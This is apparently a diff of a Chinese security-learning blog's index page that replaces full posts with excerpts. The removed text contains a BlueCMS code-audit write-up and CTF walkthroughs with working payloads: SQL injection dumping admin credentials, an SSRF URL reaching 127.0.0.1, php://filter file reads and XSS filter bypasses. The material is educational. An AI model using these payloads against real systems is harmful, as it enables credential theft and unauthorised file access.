@@ -430,92 +430,19 @@
       
         
           
-            <p>最近准备入坑代码审计了,当然作为一名萌新,肯定少不了参考很多大佬的资料了,也是经由大佬推荐,入门比较适合审计BlueCMS1.6 SP1,除了第一次看CMS的代码,犯了很萌新的错误就是,文件是一个个读的没有切入点,自然读了很久也审不出来什么东西了,好了,废话不多说,来看看这个CMS有哪些漏洞吧(我跟随大佬的脚步找到的)</p>
-<p>参考大佬文章:<br><a href="https://www.freebuf.com/articles/web/166602.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/166602.html</a></p>
-<h1>ad_js.php-SQL注入漏洞</h1>
-首先第一个也就是最多被人提及的注入漏洞了,这个是直接Seay自动审计就可以审计出来的(大多数时候不要相信这个玩意儿)
-<img src="/php代码审计入门笔记-bluecms.htm/aj_js_sql.jpg">
-然后就看到了这一串代码,这段代码只是简单的对ip参数进行了去除首位空白符的操作,并没有对用户输入进行过滤,table()函数只是为表名加上了'blue_'的前缀,而getone()函数则是将sql语句传过去,进行查询并没有进行过滤,但开头应用了一个common.inc.php,我们去看看是不是配置了什么其他过滤设置.
-<img src="/php代码审计入门笔记-bluecms.htm/table1.jpg">
-<img src="/php代码审计入门笔记-bluecms.htm/table2.png">
-<img src="/php代码审计入门笔记-bluecms.htm/getone.jpg">
-<img src="/php代码审计入门笔记-bluecms.htm/magic.jpg">
-这里定义了如果魔术引号没有使用的话,将会对全局变量$_POST,$_GET,$_COOKIE,$_REQUEST调用deep_addslashe()函数,然后我们再去看看deep_addslashe()这个函数长什么样
-<img src="/php代码审计入门笔记-bluecms.htm/lu.jpg">
-我们发现这个函数将利用递归,将数组内的所有内容全部使用了addslashe()函数--即对输入中的引号加上'/'就像下面的官方手册范例一样
-<img src="/php代码审计入门笔记-bluecms.htm/exap.png">
-经由测试,魔术引号是没有打开的也就是说,我们通过GET,POST,COOKIE传进来的数据中的引号都会被加上下划线,然后注意看原来ad_js.php的sql语句,发现了吗?这是数字型的注入,也就是说我们并不需要使用引号去闭合前面的语句,因此存在注入,那么是否有回显呢?注意下方的语句:
-<img src="/php代码审计入门笔记-bluecms.htm/hui.jpg">
-这条语句实际上起的作用是,如果查询成功则将查询的结果,以html注释的形式回显出来,然而出现查询错误,则会完整的将查询语句回显出来(非注释)如下图:
-<img src="/php代码审计入门笔记-bluecms.htm/wrong1.png">
-<img src="/php代码审计入门笔记-bluecms.htm/wrong.png">
-由于是数字型注入,且有回显因此这里可以使用union联合查询注入,过程如下图:
-前面已经使用order...by语句查询到了有7个列,因此接下来检查回显:
-<img src="/php代码审计入门笔记-bluecms.htm/xian.png">
-然后爆表名:
-<img src="/php代码审计入门笔记-bluecms.htm/btable.png">
-随后爆列名(这里需要注意的是由于deep_addslashe()函数的存在,这里如果使用表名加引号会自动被加上'/',导致查询失败,因此需要进行16进制编码绕过:
-<img src="/php代码审计入门笔记-bluecms.htm/bcolumn.png">
-最后回显admin用户的信息:
-<img src="/php代码审计入门笔记-bluecms.htm/data.png">
-<h1>ip伪造sql注入</h1>
-首先阅读配置文件的时候,发现了一个问题,就是前文提及的对全局变量过滤的函数,实际上忽略了$_SERVER和$_FILES这两个全局变量,也就以为则,这两个超级变量的引用将不会有任何的处理,而根据getip()函数,表明服务器获得ip的方式既可以使用X-Forwarded-for来伪造,也可以使用client-ip来伪造,两者皆可.
-<img src="/php代码审计入门笔记-bluecms.htm/ip.jpg">
-既然猜测在使用ip的时候没有进行数据处理,那么可以通过全局搜索调用getip()的地方,来寻找是否有注入点的地方,如下图:
-<img src="/php代码审计入门笔记-bluecms.htm/where.png">
-<img src="/php代码审计入门笔记-bluecms.htm/ip_sql_point_LI.jpg">
-阅读这个insert语句,发现其中的变量在前后并没有过滤,或者说对getip()函数返回的结果没有进行过滤,因此这里存在注入,具体利用方式参照
-<a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/" target="_blank" rel="noopener">blueCMSsql注入</a>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">','</span><span class="number">1</span><span class="string">'),('</span><span class="string">','</span><span class="number">6</span><span class="string">','</span><span class="number">2</span><span class="string">','</span><span class="number">1</span><span class="string">','</span><span class="number">6</span><span class="string">',(select concat(admin_name,'</span>:<span class="string">',pwd) from blue_admin),'</span><span class="number">1</span><span class="string">','</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<img src="/php代码审计入门笔记-bluecms.htm/ying.png">
-<p>博客中的payload,思路就是闭合前一个VALUE(),再构造下一个(),这里如果输入错误的sql语句会将sql语句全部回显出来,因为这个INSERT注入会涉及很多参数,而除了回显点,都需要和前一个VALUE()保持一致.</p>
-<img src="/php代码审计入门笔记-bluecms.htm/zhu.png">
-<img src="/php代码审计入门笔记-bluecms.htm/reu.png">
-<p>PS:这里有个小坑的地方,回显语句后面的哪个参数是时间戳,也就是注入之后,回显的评论时候是由注入语句后那个参数决定了,之前按照上面博客的语句,注入的数据在最下面(时间为1970年).</p>
-<h1>有关用户支付功能存在的问题</h1>
-<img src="/php代码审计入门笔记-bluecms.htm/pay.jpg">
-这个漏洞没有办法复现,因为网站的支付模块没有开启,而我加载的时候,会提示支付模块损坏,所以暂时无法复现,但这个漏洞其实是很明显,
-具体利用过程,请参照博客: <a href="https://www.freebuf.com/vuls/196190.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/196190.html</a>
-<img src="/php代码审计入门笔记-bluecms.htm/LI.jpg">
-注意这里POST上来的pay参数,我们可以看到前后没有做任何数据处理,就进行了包含语句的拼接,但是后面直接拼接了一个ndex.php,是不是我们只能包含带有index.php的文件呢?答案当然是否定的,由于这个CMS版本老旧,需要运行在phpstudy--PHP5.2的版本,而这个版本是存在%00截断和url长度截断的,因此可以利用这两个方法进行截断,从而包含我们想要的文件.
-PS:这里的%00用不了,应为前面$_POST会直接调用deep_addslashe()函数,让%00被加上'/',从而无法执行截断.
-<h1>from参数任意包含漏洞</h1>
-这个起因应该是发现一些功能会拼接这个$from参数,这个参数是用户可控参数,并且没有进行除了deep_addslashe()之外的任何处理,原来以为只是一个重定向的问题,但最后感觉问题还是挺大的,源码如下图:
-<img src="/php代码审计入门笔记-bluecms.htm/from.jpg">
-这是from参数的来源,只是先判断是否为空,不为空则直接获得REQUEST的值,然后我们再来看看,哪里使用了这个可控参数.
-<img src="/php代码审计入门笔记-bluecms.htm/from.jpg">
-<li><em>first</em>:do_login</li>
-从act参数的名字可以看出,这个是在进行登陆操作的时候会调用这个参数
-<li><em>second</em>:do_reg</li>
-第二个则是进行注册时,会使用这个from参数,但这个参数通过测试,是进行重定向的作用,这个值默认为空,在判断里面空的情况下是为了重定向至user.php,但这个参数是可控的,通过用户构造恶意的base64编码后的数据,能够控制重定向的位置,这里以注册功能为例(登陆功能也是类似的):
-
-这里from参数的值是由base64编码之后的../../../phpMyAdmin,然后burpsuite抓到了下一步的数据包,居然是请求GET-phpMyAdmin的数据包
-<img src="/php代码审计入门笔记-bluecms.htm/burp.png">
-而且还携带了blueCMS的参数(注意看Cookie)
-这是最开始测试时候使用的登陆功能,我们可以发现哪个showmsg.htm的页面上<a>标签的href已经变成了我们注入的脏数据了.
-<img src="/php代码审计入门笔记-bluecms.htm/blue.png">
-这也就意味我们可以通过这个参数完成对文件的包含,那么我来再来看看为什么会出现这种问题,问题其实是出在showmsg()函数上面
-<img src="/php代码审计入门笔记-bluecms.htm/showmsg.jpg">
-就是这个基本上一定会调用的这个函数
-<img src="/php代码审计入门笔记-bluecms.htm/fun.jpg">
-函数原型在这里,assign()主要是将传入的值变成键值对的形式,而display()函数太长了,读完发现就只是用于在showmsg.htm页面上显示错误信息而已,问题其实是出在htm里,我们来看看源码
-<img src="/php代码审计入门笔记-bluecms.htm/htm.png">
-这里JS就将传入的gourl传给了自动跳转的函数上面,而gourl则是传入的from值,所以用户能够通过控制from值来进行文件包含.
-<h1>修改新闻上面存在的XSS</h1>
-<img src="/php代码审计入门笔记-bluecms.htm/xss.jpg">
-先来看这个功能进行了什么操作,前面的$autor,$source都进行了html实体编码,基本上不能注入,但我们看看后面剩下的参数对$content参数进行了去掉前后字符和过滤了一些数据,然后判断有没有$descript,有的话截取$descript的前90个字符(也就是长度限制),如果,如果没有$descript的话则会对$content参数再进行一次过滤,也就是说如果我们传入了$descript的值,就会少进行一次过滤,因此存在XSS的可能性.
-<img src="/php代码审计入门笔记-bluecms.htm/filter.jpg">
-看看filter_data()函数原型,我们可以发现是利用了正则表达式,对元数据进行了一次过滤,也就是说我们可以通过双写绕过,同时这里没有不区分大小写的匹配,因此也可以通过大写标签绕过.最后这里过滤的标签还少了几个,可以直接使用<img>的属性中,引用JS脚本,最后利用过程,这里简单的在修改新闻界面抓包,对注入的数据进行二次修改(因为包里的数据实际上是对'<'和'>'进行了html实体编码的,但只进行了一次,因此可以通过抓包该回去),大致过程如下:
-<img src="/php代码审计入门笔记-bluecms.htm/payload.png">
-<img src="/php代码审计入门笔记-bluecms.htm/qian.png">
-<img src="/php代码审计入门笔记-bluecms.htm/tan.png">
-<h1>总结</h1>
-最后感觉PHP代码审计还是比较有意思,当然思维模式很重要,我是一开始就从功能下手,一个个文件去审计,这样既需要搞懂CMS本身的架构逻辑,还需要大量的时间,效率真的是非常的低,因此上面参考的两篇博客都说到了思维这个东西.大佬们似乎比较建议用两个方式进行审计.
-<li>从黑盒测试入手,追踪数据流,从而快速判断哪些功能出现问题,缺点是很容易漏掉一些不容易注意的网页</li>
-<li>从用户输入入手,对于所有的功能文件,只关注用户输入,可能还是需要搞清页面本身的逻辑,但比一行行代码的读取有效率多了.....</li>
-最后希望自己在代码审计的路上能够走远点,没事多看看CMS(flag高高立起...)</'和'></a>
+            <p>
+              最近准备入坑代码审计了,当然作为一名萌新,肯定少不了参考很多大佬的资料了,也是经由大佬推荐,入门比较适合审计BlueCMS1.6 SP1,除了第一次看CMS的代码,犯了很萌新的错误就是,文件是一个个读的没有切入点,自然读了很久也审不出来什么东西了,好了,废话不多说,来看看这个CMS有哪些漏洞吧(我跟
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/php代码审计入门笔记-bluecms.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -891,20 +818,19 @@ PS:这里的%00用不了,应为前面$_POST会直接调用deep_addslashe()函数
       
         
           
-            <p>这里吐槽一下学校考试的判题系统对Python的极度不友好,给的电脑环境是python3.4,实际上判题环境是python2.x,数据结构考试的时候Python2的输出坑死我了…<br>首先Python2的输出是会自动添加换行符”\n”的,解决这个换行符的方法便是在print语句的末尾加上”,”,这样python会知道这里不需要换行,但是这个贴心的print语句,<br>会很智能的(智障的)给你在输出的末尾加上” “–一个空格.<br>如下图:</p>
-<img src="/Python2输出贴士.htm/1.png">
-<p>输出比较:</p>
-<img src="/Python2输出贴士.htm/2.png">
-<p>解决方法有两种,一种是引入sys包,利用sys.stdout.write(string)来解决,还有一种是在print需要的字符前加”\b”,也能让Python不自动输出空格</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">""</span></span><br></pre></td></tr></table></figure>
-
-<p>这一句是为了让输出换行,方便看效果<br>具体效果如下图:</p>
-<img src="/Python2输出贴士.htm/3.jpg">
-<p>输出比较:</p>
-<img src="/Python2输出贴士.htm/4.png">
-<p>这样就可以解决了,最后希望学校稍微注意一下,起码环境要和判题环境匹配吧…….w(-Д-)w</p>
-
+            <p>
+              这里吐槽一下学校考试的判题系统对Python的极度不友好,给的电脑环境是python3.4,实际上判题环境是python2.x,数据结构考试的时候Python2的输出坑死我了…首先Python2的输出是会自动添加换行符”\n”的,解决这个换行符的方法便是在print语句的末尾加上”,”,这样pyth
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/Python2输出贴士.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1078,120 +1004,20 @@ PS:这里的%00用不了,应为前面$_POST会直接调用deep_addslashe()函数
       
         
           
-            <p>最近都没怎么写博客了，一是前段时间有点忙，二是研究了一段时间的爬虫，废话不多说直接上代码吧。<br>以下代码主要参照一个python爬虫学习的公众号–学习python的正确姿势，是非常有趣的python学习公众号，你看了下面的代码用途就知道为什么有趣了。</p>
-<pre><code class="Python"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver
-<span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By//通过什么方式去定位元素的一个类
-<span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException
-<span class="keyword">from</span> selenium.webdriver.firefox.options <span class="keyword">import</span> Options//可以从这个去设置浏览器为无头模式
-<span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC
-<span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait//引入一个控制是否超时的机制
-<span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup//解析xml的库
-<span class="keyword">import</span> time
-<span class="keyword">import</span> xlwt
-<span class="keyword">import</span> json
-<span class="string">"""这里主要是引入一些定制好的库，比如最出名的selenium是可以模拟浏览器的操作；然后time库是用于进行一定时间的休息，算是反反爬虫，xlwt是一个写入excel文件的库</span>
-<span class="string">json就不用我多说了吧。</span>
-<span class="string">"""</span>
-<span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span>
-    <span class="keyword">try</span>:
-        print(<span class="string">"开始访问B站.............."</span>)
-        fox.get(url)
-//这里的url是B站的首页
-        index=wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,<span class="string">"#primary_menu&gt;ul&gt;li.home&gt;a"</span>)))
-        index.click()
-//这里我们通过css选择器定位到了B站的”首页“元素，由于刚打开开始爬取是会要求我们登陆，从而影响定位，所以先点击首页刷新一下
-        input=wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,<span class="string">"#banner_link&gt;div&gt;div&gt;form&gt;input"</span>)))
-        input.send_keys(<span class="string">"鸡你太美"</span>)
-//这里我们选中了B站的搜索框，并输入了关键字”鸡你太美“
-        button=wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,<span class="string">"#banner_link&gt;div&gt;div&gt;form&gt;button"</span>)))
-        button.click()
-//这里选中了B站的搜索按钮，并点击了搜索
-        print(<span class="string">"跳转新窗口"</span>)
-        all_h = fox.window_handles
-        fox.switch_to.window(all_h[<span class="number">1</span>])
-        get_source()
-        total=wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,<span class="string">"#server-search-app&gt;div.contain&gt;div.body-contain&gt;div&gt;div.page-wrap&gt;div&gt;ul&gt;li.page-item.last&gt;button"</span>)))
-        //这里定位到了B站的最后一页元素
-        <span class="keyword">return</span> int(total.text)
-//获得最后一页元素的数字，方便我们知道要执行多少次
-    <span class="keyword">except</span> TimeoutException:
-        <span class="keyword">return</span> search()
-
-<span class="function"><span class="keyword">def</span> <span class="title">next_page</span><span class="params">(page_num)</span>:</span>
-    <span class="keyword">try</span>:
-        print(<span class="string">'获取下一页数据'</span>)
-        time.sleep(<span class="number">3</span>)
-//爬取太快似乎会被B站搞，所以暂时性的休眠<span class="number">3</span>秒，如果决定慢也可以自行修改
-        next= wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,<span class="string">'#server-search-app&gt;div.contain&gt;div.body-contain &gt;div&gt;div.page-wrap&gt;div&gt;ul&gt;li.page-item.next&gt;button'</span>)))
-        next.click()//定位到了下一个元素并点击
-        wait.until(EC.text_to_be_present_in_element((By.CSS_SELECTOR,<span class="string">'#server-search-app&gt;div.contain&gt;div.body-contain&gt;div&gt;div.page-wrap&gt;div&gt;ul&gt;li.page-item.active&gt;button'</span>),str(page_num)))//这里定位到当前页面
-        get_source()
-    <span class="keyword">except</span> TimeoutException:
-        fox.refresh()
-        <span class="keyword">return</span> next_page(page_num)
-
-
-<span class="function"><span class="keyword">def</span> <span class="title">get_source</span><span class="params">()</span>:</span>
-    <span class="keyword">try</span>:
-        print(<span class="string">"正在获得当前数据中......."</span>)
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,<span class="string">"#server-search-app&gt;div.contain&gt;div.body-contain&gt;div&gt;div.result-wrap.clearfix"</span>)))
-        html=fox.page_source//这里是获得B站下面一大块具有视频信息的DOM位置
-        soup=BeautifulSoup(html,<span class="string">'lxml'</span>)
-        print(<span class="string">"获得数据完毕......."</span>)
-        save_data(soup)
-    <span class="keyword">except</span>:
-        <span class="keyword">pass</span>
-
-<span class="function"><span class="keyword">def</span> <span class="title">save_data</span><span class="params">(soup)</span>:</span>
-    print(<span class="string">"开始写入数据..........."</span>)
-    list=soup.find(class_=<span class="string">"all-contain"</span>).find_all(class_=<span class="string">"info"</span>)
-    <span class="keyword">for</span> item <span class="keyword">in</span> list:
-        item_title=item.find(<span class="string">"a"</span>).get(<span class="string">"title"</span>)//得到标题
-        item_link=item.find(<span class="string">"a"</span>).get(<span class="string">"href"</span>)//得到链接
-        item_dec=item.find(class_=<span class="string">"des hide"</span>).text//得到描述
-        item_view=item.find(class_=<span class="string">"so-icon watch-num"</span>).text//得到播放量
-        item_time=item.find(class_=<span class="string">"so-icon time"</span>).text//得到上传时间
-        item_up=item.find(class_=<span class="string">"up-name"</span>).text//得到UP主名称
-        print(item_up)//这里将其打印出来，以便在控制台观察是否出错
-        item_danmu=item.find(class_=<span class="string">"so-icon hide"</span>).text//这里是弹幕数
-        print(<span class="string">"爬取:"</span>+item_title)
-        <span class="keyword">global</span> n//设置为全局变量
-        sheet.write(n, <span class="number">0</span>,item_title)
-        sheet.write(n, <span class="number">1</span>,item_link)
-        sheet.write(n, <span class="number">2</span>, item_dec)
-        sheet.write(n, <span class="number">3</span>, item_view)
-        sheet.write(n, <span class="number">4</span>, item_time)
-        sheet.write(n, <span class="number">5</span>, item_up)
-        sheet.write(n, <span class="number">6</span>, item_danmu)//分别写入xls对应得列
-        print(<span class="string">"当前数据写入完成........"</span>)
-        n=n+<span class="number">1</span>
-data=xlwt.Workbook(encoding=<span class="string">"utf-8"</span>,style_compression=<span class="number">0</span>)
-sheet=data.add_sheet(<span class="string">"鸡你太美"</span>,cell_overwrite_ok=<span class="keyword">True</span>)
-sheet.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">"名称"</span>)
-sheet.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">"链接"</span>)
-sheet.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">"描述"</span>)
-sheet.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">"观看次数"</span>)
-sheet.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">"上传时间"</span>)
-sheet.write(<span class="number">0</span>,<span class="number">5</span>,<span class="string">"Up主"</span>)
-sheet.write(<span class="number">0</span>,<span class="number">6</span>,<span class="string">"弹幕数"</span>)
-n=<span class="number">1</span>//进行excel最初列的设置
-url = <span class="string">"https://www.bilibili.com"</span>
-fox = webdriver.Firefox()
-//安装什么浏览器的内核就用什么浏览器
-wait = WebDriverWait(fox,<span class="number">10</span>)
-//设置最大的等待时间是多少
-<span class="keyword">try</span>:
-    total = search()
-    print(total)
-    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, int(total)+<span class="number">1</span>)://
-这里用获得的最大页数控制循环次数，因为前面以及爬取了第一页因此从<span class="number">1</span>开始
-        next_page(i)
-<span class="keyword">finally</span>:
-    fox.close()
-data.save(<span class="string">u"菜虚鲲打篮球.xls"</span>)</code></pre>
-<p>效果图如下：<br>刚开始的时候弹出了登录框：<br><img src="/爬虫学习1-selenium简单爬虫.htm/0.jpg" alt=""><br>随后进行刷新：<br><img src="/爬虫学习1-selenium简单爬虫.htm/1.jpg" alt=""><br>然后开始爬取：<br><img src="/爬虫学习1-selenium简单爬虫.htm/2.jpg" alt=""><br><img src="/爬虫学习1-selenium简单爬虫.htm/3.jpg" alt=""><br>最后爬取的文件和内容：<br><img src="/爬虫学习1-selenium简单爬虫.htm/4.png" alt=""><br><img src="/爬虫学习1-selenium简单爬虫.htm/5.png" alt=""><br>PS：这里选中元素也可以使用XML，但是无论CSS选择器还是XML都能在定位好元素后，对定位元素点右键复制，能够<br>直接复制CSS选择器和XML不需要自行填写</p>
-
+            <p>
+              最近都没怎么写博客了，一是前段时间有点忙，二是研究了一段时间的爬虫，废话不多说直接上代码吧。以下代码主要参照一个python爬虫学习的公众号–学习python的正确姿势，是非常有趣的python学习公众号，你看了下面的代码用途就知道为什么有趣了。
+from selenium import webdr
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/爬虫学习1-selenium简单爬虫.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1380,30 +1206,21 @@ data.save(<span class="string">u"菜虚鲲打篮球.xls"</span>)</code></pre>
       
         
           
-            <p>消失了一段时间，练习了一下python以弥补肝CTF题时，因为不会写脚本，而无法解决快速口算之类问题的遗憾。<br>不多说来贴脚本源码吧，这是按照某个大佬的脚本来写的，链接在这里:<a href="https://www.jianshu.com/p/344538576ecb" target="_blank" rel="noopener">CTF快速口算</a><br>这里就来贴源码:</p>
-<pre><code>import requests
-url=&quot;******************&quot;
-cook=requests.session()
-html=cook.get(url).text
-print(html)
-def getdata(html,start,end):
-    a=html.find(start)
-    b=html.find(end,a+len(start))
-    c=html[a+len(start):b]
-    return c
-exp=getdata(html,&apos;&lt;br/&gt;&apos;,&apos;&lt;/p&gt;&apos;).replace(&quot; &quot;,&apos;&apos;)
-print (exp)
-result=eval(exp)
-print(v)
-data={&quot;result&quot;:result}
-final=cook.post(url,data=data)
-print(final.text)</code></pre><p>首先对于这种网页的爬取操作，我们需要的就是Python里面的requests模块了，这个模块也在爬虫里面经常使用，建议可以去学习一下。<br>分析如下：<br>首先就是把url给定，然后就是得到给定url的session了,<a href="https://baijiahao.baidu.com/s?id=1569587264497242&wfr=spider&for=pc" target="_blank" rel="noopener">有关session是个啥</a><br>虽然通过requests里面自带的get（）方法爬取页面的html代码，然后再转化成为文本格式也就是后面.text的作用。<br>爬取的页面内容如下图：</p>
-<img src="/CTF快速口算脚本.htm/paqu.png">
-<p>然后我们找到需要截取内容的特征，这里可以看到表达式位于标签</p>
-<pre><code>&lt;br/&gt;</code></pre><p>之后，位于</p>
-<pre><code>&lt;/p&gt;</code></pre><p>之前，<br>这中间的内容就是我们需要截取的内容了，这里仿造大佬的截取函数，构造了一个getdata（）函数，来获得表达式的内容，然后用eval（）函数直接执行表达式的内容，<br>通过观察html我们可以知道，提交的表单是以post方法提交，并且表单名为result，而通过构造字典这种键值对的结构，可以模拟表单的提交。这里需要使用前面给的session提交，<br>否则表达式就不是同一个了。最后获取返回来的页面，再进行打印就可以得到flag了。</p>
-<img src="/CTF快速口算脚本.htm/flag.jpg">
+            <p>
+              消失了一段时间，练习了一下python以弥补肝CTF题时，因为不会写脚本，而无法解决快速口算之类问题的遗憾。不多说来贴脚本源码吧，这是按照某个大佬的脚本来写的，链接在这里:CTF快速口算这里就来贴源码:
+import requests
+url=&quot;******************&quo
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/CTF快速口算脚本.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1582,20 +1399,19 @@ print(final.text)</code></pre><p>首先对于这种网页的爬取操作，我�
       
         
           
-            <p>今天做了一下sqli-labs头部注入的两道题，下面来说说自己的所得吧。首先，做了这么多便发现了，其实真正存在sql回显注入（union联合查询注入）是比较少见的，<br>而一般更加普遍一点的便是报错注入了，无论是子查询报错注入，还是updatexml(),extractvalue()函数的报错注入都应该熟练掌握，之前一直使用的报错注入都是在<br>select语句里面实现的，但是这次的http包头部注入不同，是存在于insert语句里面的注入，所以使用报错注入的时候出现了下面的问题。</p>
-<h1>问题1:参数的闭合</h1>
-<img src="/sqli-labs-18-19的一点小启示.htm/php.png">
-首先先看看源码，由于前面已经对post参数进行了过滤和检查，所以我们不能从post的数据入手，阅读下来便看到了下面这条insert语句，他会插入两个参数的数据，
-这时如果我们忘记了闭合第二个参数，就会出现下面的这种情况:
-<img src="/sqli-labs-18-19的一点小启示.htm/1.png">
-这里用的updatexml()，而正确的应该在updatexml()的外面再闭合第二个插入数据的参数，如下图：
-<img src="/sqli-labs-18-19的一点小启示.htm/2.png">
-<h1>问题2:查询返回值多于1列的情况</h1>
-如果我们直接查询select table_name会返回一个错误:
-<img src="/sqli-labs-18-19的一点小启示.htm/3.png">
-这个时候我们记得要使用group_concat()这个函数了，可以保证只返回一列，当然也可以在后面加上limit语句来限制返回值。
-正确的利用在上面，这里就不赘述了
+            <p>
+              今天做了一下sqli-labs头部注入的两道题，下面来说说自己的所得吧。首先，做了这么多便发现了，其实真正存在sql回显注入（union联合查询注入）是比较少见的，而一般更加普遍一点的便是报错注入了，无论是子查询报错注入，还是updatexml(),extractvalue()函数的报错注入都应该熟
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/sqli-labs-18-19的一点小启示.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1784,51 +1600,21 @@ print(final.text)</code></pre><p>首先对于这种网页的爬取操作，我�
       
         
           
-            <p>做了一下Hgame2019的CTF，由于后面涉及写脚本问题，暂时只能动到第二周的题，这道题我感觉收获最大。<br>就是PHP trick这道题，我们先看源码，如下图：</p>
-<img src="/hgameCTF之PHP trick.htm/源码.png">
-<p>然后按照这个题给的意思应该是需要我们绕过这层层过滤，去访问admin.php。（PS:我尝试了直接访问，提示需要本地访问–localhost，然后用burpsuite改了并没有什么用）<br>所以先来看看给出的源码，所有参数都是通过GET方法来获取的，这样我们直接使用hackbar就可以了</p>
-<h1>第一二个if的绕过</h1>
-先看第一个if要求str1和str2不相等,这个可以轻易绕过，主要
-就是第二个if要求str1和str2的MD5值相等，注意是"=!"也就是弱相等，因此我们可以构造md5值为0e开头的，php在读入X（X是数字）e开头的字符会理解为X的多少次方，
-因此0E开头，可以理解为0的多少次方，我们知道0^n无论如何还是0，所以就能够绕过第二个if了。
-这里构造参数
-<pre><code>str1=s878926199a str2=s155964671a</code></pre>
-<h1>第三四个if的绕过</h1>
-我们看到第三个if仍然是相同的套路，但这时MD5值得校验已经变成了强相等，这时候不能再用之前得方法绕过了，我们可以用数组进行绕过，由于如果在MD5里面传入
-数组的话，那么MD5函数会返回一个NULL，由于两边都是NULL，所以就可以绕过这个强相等问题了。
-<pre><code>str3[]=1 str4[]=2</code></pre>
-因为这种写法会使php的参数变成error，而两个参数均为error转换为MD5后值一定相同。
-<h1>第五六七个if绕过</h1>
-$_SERVER["QUERY_STRING"]这个在PHP中等同于查询字符"?"后的所有字符，因此第五个if要求H_game字符不能在"?"后面出现，但由于$str5 = @$_GET['H_game'];
-也就是说我们必须传入h_game参数，并且要是数字，而且不能满足后面两个if，即又要>=9999999999，转化为字符后又必须<=0。 一步一步来，先绕过校验h_game存在，这里可以利用url编码进行绕过，轻轻松松。而后面两个if也可以用数组进行绕过="" 最后h_game参数就直接变成了="" <pre=""><code>%48%5f%67%61%6d%65[]=%20</code>
-<h1>第八九十个if绕过</h1>
-parse_url（）函数是用于解析我们的URL并返回组成部分，这最后两个if就是校验我们的传入URL的协议名是否是http，然后域名是不是www.baidu.com，虽然能够直接传入这个值，但是后面
-就会出现问题。如果我们直接传入
-<pre><code>url=http://www.baidu.com</code></pre>
-那么我们会发现下面出现了百度的界面
-<img src="/hgameCTF之PHP trick.htm/baidu.png">
-<h1>curl的处理</h1>
-curl在这里相当于解析我们的url并进行访问，但注意curl的访问，相当于在服务器内部进行的访问，也就是说如果我们访问本地的文件，就相当于以localhost去访问本地
-资源，因此要想办法让curl解析访问admin.php，这里就要利用URL的组成了，首先parse_url（）在解析host时，会解析第二个@后面的内容，而CURL则会解析第一个@后的内容
-<a href="http://www.php.cn/php-weizijiaocheng-393305.html" target="_blank" rel="noopener">有关curl是个啥</a>
-因此这里构造参数
-<pre><code>url=http://@127.0.0.1:80@www.baidu.com/admin.php</code></pre>
-便可以成功访问admin.php了，但不知道为什么直接用127.0.0.1不能直接访问需要加个80端口。
-<h1>php伪协议读取</h1>
-admin.php的源码如下：
-这里要求传参为GET方法传入的参数filename，
-并且会校验该文件是否存在，如果存在则会输出一段话，而不会读取，
-而读取文件函数却是在文件不存在条件下才会执行，这里很显然不能直接读取，我们可以使用php伪协议的方法进行文件读取，
-有关php伪协议的知识可以参照下文：
-<a href="http://www.cnblogs.com/LittleHann/p/3665062.html" target="_blank" rel="noopener">PHP伪协议</a>
-最后利用php://filter读取flag.php
-<pre><code>filename=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
-<img src="/hgameCTF之PHP trick.htm/admin.png">
-最后将这段base64解码就可以得到flag啦。
-<img src="/hgameCTF之PHP trick.htm/flag.png">
-完整的payload如下图:
-<img src="/hgameCTF之PHP trick.htm/payload.png"></=0。>
+            <p>
+              做了一下Hgame2019的CTF，由于后面涉及写脚本问题，暂时只能动到第二周的题，这道题我感觉收获最大。就是PHP trick这道题，我们先看源码，如下图：
+
